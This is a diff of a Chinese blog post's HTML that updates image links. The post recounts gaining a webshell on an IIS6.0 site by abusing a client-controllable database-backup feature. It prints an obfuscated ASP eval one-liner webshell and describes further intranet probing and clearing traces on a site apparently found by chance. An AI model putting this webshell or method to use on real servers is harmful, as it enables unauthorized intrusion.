@@ -95,21 +95,21 @@
 <meta property="og:site_name" content="Leticia&#39;s Blog">
 <meta property="og:description" content="0x00 前言很久之前通过数据库备份拿到的一个webshell，本来准备等他们修复了之后再写的，但是提交了漏洞和修复方案他们接收之后很长时间没有修复，忽视了漏洞。所以今天写出来了。 0x01 多次尝试首先这个站是偶然google hacking时找到的后台弱密码，进入后台之后发现是IIS6.0的服务器：  这个后台可以对前端的文章、新闻等进行修改，发现可以上传图片到文章中，是一个上传点。  先编辑">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback01.png">
-<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback02.png">
-<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback03.png">
-<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback04.png">
-<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback05.png">
-<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback06.png">
-<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback07.png">
-<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback08.png">
-<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback09.png">
-<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback10.png">
-<meta property="og:updated_time" content="2018-05-30T03:18:14.695Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback01.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback02.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback03.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback04.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback05.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback06.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback07.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback08.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback09.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback10.png">
+<meta property="og:updated_time" content="2018-10-26T03:30:52.090Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="数据库备份getshell">
 <meta name="twitter:description" content="0x00 前言很久之前通过数据库备份拿到的一个webshell，本来准备等他们修复了之后再写的，但是提交了漏洞和修复方案他们接收之后很长时间没有修复，忽视了漏洞。所以今天写出来了。 0x01 多次尝试首先这个站是偶然google hacking时找到的后台弱密码，进入后台之后发现是IIS6.0的服务器：  这个后台可以对前端的文章、新闻等进行修改，发现可以上传图片到文章中，是一个上传点。  先编辑">
-<meta name="twitter:image" content="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback01.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback01.png">
 
 
 
@@ -397,28 +397,28 @@
       
         <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>很久之前通过数据库备份拿到的一个webshell，本来准备等他们修复了之后再写的，但是提交了漏洞和修复方案他们接收之后很长时间没有修复，忽视了漏洞。所以今天写出来了。</p>
 <h2 id="0x01-多次尝试"><a href="#0x01-多次尝试" class="headerlink" title="0x01 多次尝试"></a>0x01 多次尝试</h2><p>首先这个站是偶然google hacking时找到的后台弱密码，进入后台之后发现是IIS6.0的服务器：</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback01.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback01.png" alt=""></p>
 <p>这个后台可以对前端的文章、新闻等进行修改，发现可以上传图片到文章中，是一个上传点。</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback02.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback02.png" alt=""></p>
 <p>先编辑一个一句话木马,存为asp格式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval&quot;&quot;&amp;(&quot;e&quot;&amp;&quot;v&quot;&amp;&quot;a&quot;&amp;&quot;l&quot;&amp;&quot;(&quot;&amp;&quot;r&quot;&amp;&quot;e&quot;&amp;&quot;q&quot;&amp;&quot;u&quot;&amp;&quot;e&quot;&amp;&quot;s&quot;&amp;&quot;t&quot;&amp;&quot;(&quot;&amp;&quot;0&quot;&amp;&quot;-&quot;&amp;&quot;2&quot;&amp;&quot;-&quot;&amp;&quot;4&quot;&amp;&quot;)&quot;&amp;&quot;)&quot;)%&gt;</span><br></pre></td></tr></table></figure></p>
 <p>直接上传.asp文件，被防火墙阻止。</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback03.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback03.png" alt=""></p>
 <p>先上传.jpg文件，然后通过burpsuite更改后缀为.asp，然后上传，发现仍然被拦截，看来是后端拦截。</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback04.png" alt=""></p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback05.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback04.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback05.png" alt=""></p>
 <p>尝试使用IIS6.0的解析漏洞，将.asp;.jpg文件解析成.asp文件，但是更改了一个1.asp;.jpg后缀的文件上传之后，文件名整体被改成一个日期的+随机数+.jpg的文件名。</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback06.png" alt=""></p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback07.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback06.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback07.png" alt=""></p>
 <p>尝试用burpsuite改数据，0x00截断方式、超长文件名仍然不可行。</p>
 <h2 id="0x02-改变思路"><a href="#0x02-改变思路" class="headerlink" title="0x02 改变思路"></a>0x02 改变思路</h2><p>本来测试到这里我已经放弃通过上传点来getshell，但是不甘心就去问了下朋友，朋友说他正好在复现这个kindeditor编辑器的漏洞，为我提供了其他思路，我去网上找了一会kindeditor编辑器漏洞版本，尝试了一会，发现目前这个版本是4.1.10不存在之前那些典型的漏洞。</p>
 <p>然后这个时候朋友告诉我有数据库备份，可以通过数据库备份功能来利用解析漏洞。</p>
 <h2 id="0x03-开始尝试"><a href="#0x03-开始尝试" class="headerlink" title="0x03 开始尝试"></a>0x03 开始尝试</h2><p>先编辑一个过狗asp马，更改为jpg格式上传。</p>
 <p>然后在数据库备份界面，发现直接无法更改备份的源路径和目的路径</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback08.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback08.png" alt=""></p>
 <p>但是这两个路径是前端可控的，那就很容易了，直接f12更改页面中对应的原路径为自己上传的图片马，目的路径为123.asp即可。</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback09.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback09.png" alt=""></p>
 <p>然后备份数据库，在upload路径找到自己的马，直接用菜刀连接，成功getshell。</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback10.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback10.png" alt=""></p>
 <p>后来传大马稍微对内网测试了一下，然后完成之后清理痕迹。</p>
 <h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>虽然是很老的一个漏洞了，没有太多亮点，但是体现了渗透测试过程中要力求多样性，了解的方式和技巧越多，就距离成功越接近。</p>
 
